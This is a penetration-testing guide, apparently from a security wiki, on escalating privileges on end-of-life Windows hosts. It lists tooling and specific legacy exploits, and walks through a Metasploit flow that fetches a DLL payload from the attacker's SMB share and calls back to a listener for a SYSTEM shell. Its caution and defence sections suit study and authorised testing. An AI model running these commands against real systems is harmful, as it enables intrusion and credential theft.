## TL;DR

End-of-life Windows - Server 2008/2008 R2, Windows 7, and anything older - no longer receives security updates, so it accumulates unpatched local-privilege-escalation and RCE flaws. It's also missing the mitigations that make modern hosts hard (Credential Guard, Device Guard/WDAC, AppLocker, Control Flow Guard), so escalation is usually quicker and the public PoCs just work. You'll meet these in hospitals, universities, government, manufacturing, and retail POS fleets.

```
# Legacy-specific missing-patch enumeration (older tooling, PS2.0-friendly)
Import-Module .\Sherlock.ps1; Find-AllVulns         # on-host, flags "Appears Vulnerable"
python2.7 windows-exploit-suggester.py --systeminfo si.txt --database *.xls   # off-host, from systeminfo
# then the signature legacy LPE PoCs, e.g.:
Import-Module .\Invoke-MS16-032.ps1; Invoke-MS16-032   # Secondary Logon → SYSTEM (Win7/2008)
```

Success indicator: `whoami` → `nt authority\system` via a legacy kernel/service CVE - but **only after** you've confirmed with the client that the host can tolerate it (see the caution below).

<Aside type="caution">
Legacy hosts are disproportionately **fragile and mission-critical** - the reason they weren't upgraded is often that they run irreplaceable software (an MRI console, a POS controller, a line-of-business app from a defunct vendor). Kernel LPE PoCs against these can bluescreen or hang them. **Always confirm scope with the client before exploiting a legacy host**, prefer the gentlest confirmed-vulnerable path, and treat "don't crash it" as a hard constraint. The right finding is often network segmentation and a decommission plan, not just "we got SYSTEM."
</Aside>

## Why legacy is softer

The missing-patch surface is the obvious part, but the bigger difference is the mitigations that simply **aren't there** on older OSes. Each absence re-enables a technique the rest of this cluster has to work around on a modern host:

| Mitigation | Win7 / 2008 R2 | Win10 / 2016+ | What its absence gives you |
| --- | --- | --- | --- |
| Credential Guard | ✗ | ✓ | LSASS holds reusable secrets; WDigest plaintext passwords on by default pre-8.1 |
| Device Guard / WDAC | ✗ | ✓ | No kernel code-integrity - unsigned drivers and kernel PoCs load |
| AppLocker | partial | ✓ | Little to no application allowlisting - drop and run tools freely |
| Control Flow Guard | ✗ | ✓ | Memory-corruption kernel exploits are far more reliable |
| Windows Defender | partial | ✓ | Public PoCs and tooling often run unsignatured |

So on legacy you can usually dump credentials straight from LSASS (see [credential hunting](/codex/windows/privesc/credential-hunting/) and the LSASS route on [SeDebugPrivilege](/codex/windows/privesc/sedebugprivilege/)), run token-impersonation "potato" attacks unimpeded, and fire kernel PoCs that CFG would otherwise break.

## Enumerating legacy for missing patches

The [missing-patch → CVE workflow](/codex/windows/privesc/kernel-exploits/#confirming-the-patch-gap) is the same as for modern hosts, but the tooling differs - the modern matchers (WES-NG, Watson) target recent builds, so for legacy use the older generation:

- **[Sherlock](https://github.com/rasta-mouse/Sherlock)** - on-host PowerShell; `Find-AllVulns` checks a built-in set of older LPE bulletins and prints `Appears Vulnerable` / `Not Vulnerable` / `Not supported on 64-bit systems` per CVE. Ideal first pass on 2008/Win7.
- **[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)** (the original, not WES-NG) - off-host Python; `--update` pulls the MS bulletin DB, then feed it `systeminfo` output. Flags `[E]` exploit-db PoCs and `[M]` Metasploit modules.
- **[JAWS](https://github.com/411Hall/JAWS)** - PowerShell 2.0-compatible, for hosts too old for modern scripts.
- The **Metasploit local exploit suggester** (`post/multi/recon/local_exploit_suggester`) against an existing session shortlists usable modules fast.

```
wmic qfe                                    # last installed KB - google it; legacy hosts are often years behind
Import-Module .\Sherlock.ps1; Find-AllVulns
```

Filter the output hard: drop DoS entries and anything `Not Vulnerable` / not matching the architecture (many Win32k PoCs are `Not supported on 64-bit systems`).

## Signature legacy LPE exploits

A handful recur constantly on 2008/Win7:

- **MS10-092 - Task Scheduler `.XML` (schelevator)** - the scheduler trusts a CRC-protected task XML it doesn't properly validate; Metasploit `exploit/windows/local/ms10_092_schelevator` rewrites a task to run as SYSTEM. Reliable on Vista/7/2008.
- **MS16-032 - Secondary Logon handle** - a leaked thread handle in `seclogon`; the `Invoke-MS16-032.ps1` PowerShell PoC races it into a SYSTEM shell. Works Win7-10 / 2008-2012, no binary drop needed.
- **MS16-075 - NTLM reflection (the "potato" family)** - Hot/RottenPotato reflect a coerced SYSTEM NTLM auth back to the local host. This is the ancestor of the modern potato attacks on [SeImpersonate](/codex/windows/privesc/seimpersonate/#how-the-potato-attacks-work); on legacy it often works from any service account without the newer prerequisites.
- **MS10-015 (KiTrap0D)** and **MS08-067** - ancient but still found on XP/2003/2000; KiTrap0D is 32-bit-only, MS08-067 is a wormable RCE that doubles as a foothold.

### Worked flow (Server 2008 → SYSTEM)

A typical Metasploit path when you have a foothold shell:

```
# 1. stage a meterpreter session (smb_delivery gives a rundll32 one-liner to run on target)
msf> use exploit/windows/smb/smb_delivery        # target 0 = DLL → rundll32.exe \\IP\share\test.dll,0

# 2. migrate to an x64 process FIRST - many of these modules fail from a 32-bit (SysWOW64) host process
meterpreter> ps ; migrate <x64_pid>

# 3. run the LPE module against the session
msf> use exploit/windows/local/ms10_092_schelevator
msf> set SESSION 1 ; set LHOST <you> ; set LPORT 4443 ; exploit
#    → Meterpreter as NT AUTHORITY\SYSTEM
```

If a module's safety check wrongly reports "not vulnerable" but Sherlock/WES say otherwise, `set ForceExploit true` overrides it - use that only when you're confident and the host can take it.

## Defense

- **Patch or retire** is the real fix - but where an EOL host genuinely can't be replaced (vendor gone, certified medical/industrial software), that's a business decision, not a finding to dismiss. Report it with context.
- **Network-segment** EOL systems aggressively: isolate them on their own VLAN with strict ACLs so a compromise can't spread (these are exactly the hosts wormable flaws like EternalBlue/SIGRed devastate). Microsoft custom ESU contracts can keep critical patches flowing in the meantime.
- Restrict inbound/outbound to the minimum the legacy app needs; disable SMBv1 and legacy protocols; monitor the segment heavily since the host itself can't defend.
- Treat a legacy host as already-credential-exposed: assume LSASS secrets are recoverable, so don't let privileged/domain accounts log on to it.
